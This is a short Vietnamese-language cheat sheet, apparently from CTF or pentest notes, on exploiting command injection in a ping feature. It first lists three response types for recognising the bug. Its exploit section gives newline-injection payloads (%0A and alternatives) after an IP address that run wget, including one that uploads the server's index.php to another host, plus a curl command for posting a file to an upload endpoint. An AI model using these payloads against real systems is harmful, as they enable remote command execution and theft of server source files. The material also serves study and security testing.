# Nhận Biết
- Chỉ trả về 3 kết quả
- Ping OK
- Ping NOT OK
- Syntax Error


# Exploit
```cmd
127.0.0.1 %0A wget 192.168.1.1      => OK
%0A có thể thay = %0B , %0C , %0a%0d

127.0.0.1 %0A wget 192.168.1.1 -v -F filename=index.php -F upload=@index.php

```
- Dùng curl để gửi file vào url 
`curl -v -F filename=tenfile.txt -F upload=@tenfile.txt http://localhost:8080/api/upload`



